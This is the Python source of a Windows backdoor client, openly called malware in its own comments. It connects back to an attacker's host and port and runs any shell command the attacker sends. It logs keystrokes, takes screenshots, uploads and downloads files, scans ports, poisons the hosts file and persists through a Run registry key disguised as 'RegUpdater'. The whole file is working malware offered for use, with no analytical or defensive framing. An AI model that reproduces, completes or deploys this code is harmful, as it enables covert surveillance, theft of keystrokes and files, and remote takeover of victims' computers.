#CLIENT END

import socket
import subprocess
import os
from time import sleep
import _winreg as wreg
from PIL import ImageGrab
from tempfile import mkdtemp
import shutil
import pythoncom, pyHook
from threading import Thread
import multiprocessing

HOST_IP = ''      #Enter the host ip here
HOST_PORT = 8080               #The port on which you want to interact

flag = 0
key=0
obj = pyHook.HookManager()
dirpath_keylogger = mkdtemp()

#a simple port scannner
def scanner (s,ip,ports) :

    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            output = sock.connect_ex((ip,int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " +port+ " is opened" +'\n'
            else:
                scan_result = scan_result + "[-] Port " +port+ " is closed or Host not reachable" + '\n'
            sock.close()
        except Exception, e:
            pass
    s.send(scan_result)


#keylogger
def keypressed(event):


    if event.Ascii == 13:
        keys=' <ENTER> '
    elif event.Ascii == 8:
        keys = ' <BACK SPACE> '
    else:
        keys = chr(event.Ascii)
    global dirpath_keylogger
    print dirpath_keylogger
    path = dirpath_keylogger + "\\keylogs.txt"
    fp = open(path,"a+")
    if event.Ascii == 8:
        fp.seek(-1,os.SEEK_END)
        fp.truncate()
    elif event.Ascii == 13:
        fp.write("\n")
    else:
        fp.write(keys)
    fp.close()
    return True


def keylogger():

    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()


#receive file from host
def receive(s,name):

    bits = s.recv(20480)
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')        #Get userprofile
    destination = userprof.strip('\n\r') + '\\Desktop\\'                                     #Saves the file to desktop
    if not 'Unable to upload the file' in bits :
        f = open( destination +name,'wb')
        while True:
            if bits.endswith('DONE'):
                f.close()
                break
            f.write(bits)
            bits = s.recv(20480)
        f.close()
    else:
        return



#send file to host
def send (s , path ):

    if os.path.exists(path):
        f = open(path , 'rb')
        packet = f.read(20480)
        while packet != '':
            s.send(packet)
            packet = f.read(20480)
        s.send('DONE')
        f.close()
    else :
        s.send('Unable to find out the file')



#take screenshot and send it to host
def screenshot (s):
    dirpath = mkdtemp()
    ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
    files = dirpath + "\img.jpg"
    send(s,files)
    shutil.rmtree(dirpath)



#search for a particular file type in given directory
def search(command,s):
    command = command [7:]
    path,ext = command.split('*')
    list = ''
    for dirpath,dirname,files in os.walk(path):
        for file in files:
            if file.endswith(ext):
                list = list + '\n' + os.path.join(dirpath , file)
    s.send(list)




#change domain in victims system with given domain or ip    (requires adiministator level privileges)
def change_dns(command,s):
    command = command[4:]
    url,dns = command.split('*')
    os.chdir("C:\Windows\System32\drivers\etc")
    command1 = "echo " +url+" " + dns+ " >> hosts"
    CMD = subprocess.Popen(command1,shell = True , stdout = subprocess.PIPE ,
                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    command = "ipconfig /flushdns"
    CMD = subprocess.Popen(command1,shell = True , stdout = subprocess.PIPE ,
                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send("[+] " +dns+ " DNS poisoned with url = "+url)




#change directory
def change_directory(command,s):
    code,directory = command.split(' ')
    try:
        os.chdir(directory)
        s.send("[+] Current Working Directory is " + os.getcwd() )
    except Exception:
        s.send("[-] Unable to change Directory ")




#make a registery entery to autorun the malware every time the victim boots the system (make executable and the run the command)
def make_malware_persistent(s):
    path = os.getcwd().strip('/n')
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')               #Get userprofile
    destination = userprof.strip('\n\r') + '\\Documents\\' + 'tcp_client.exe'                       #Speify where to copy backdoor
    if not os.path.exists(destination) :                                                            #First time backdoor gets executed
        shutil.copyfile(path+'\\tcp_client1.exe',destination)
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,
                           "Software\Microsoft\Windows\CurrentVersion\Run",
                           0,wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0 , wreg.REG_SZ, destination)
        key.Close()                                                                                 #create a new registry RegUpdater pointing to new backdoor
    s.send("[+] Malware made persistent")




#interact with the host
def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect ((HOST_IP,HOST_PORT))

    while True:

        while True :
            command = s.recv(20480)
            if 'terminate' == command:
                s.close()
                global flag
                flag = 1
                break

            elif 'download' in command:
                grab,path = command.split(' ')
                try:
                    send(s,path)
                except Exception, e:
                    s.send(str(e))
                    pass

            elif 'screenshot' == command:
                screenshot(s)

            elif 'start keylog' == command:
                keyloggerThread = Thread(target = keylogger)
                keyloggerThread.daemon = True
                keyloggerThread.start()

            elif 'dump keylog' == command:
                global dirpath_keylogger
                path = dirpath_keylogger + "\\keylogs.txt"
                send(s , path)

            elif 'search' in command:
                search(command,s)


            elif 'cd ' in command:
                change_directory(command,s)

            elif 'scan' in command:

                command = command [5:]
                ip,ports = command.split(':')
                scanner(s,ip,ports)

            elif 'DNS' in command:
                change_dns(command,s)


            elif 'make persistent' == command:
                make_malware_persistent(s)


            elif 'upload' in command:
                upload,path = command.split(' ')
                path, name = command.rsplit('/',1)
                receive(s,name)


            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                t = CMD.stdout.read()
                p = CMD.stderr.read()
                s.send(t)
                s.send(p)
                if (len(t) + len(p)) == 0:
                    s.send('Command Executed')




#try to connect to host
def main():
    while True:
        global flag
        if flag == 1:
            global dirpath_keylogger
            shutil.rmtree(dirpath_keylogger)
            break
        try:
			if connect() == 1:
				break

        except:
            sleep(5)
            pass

main()
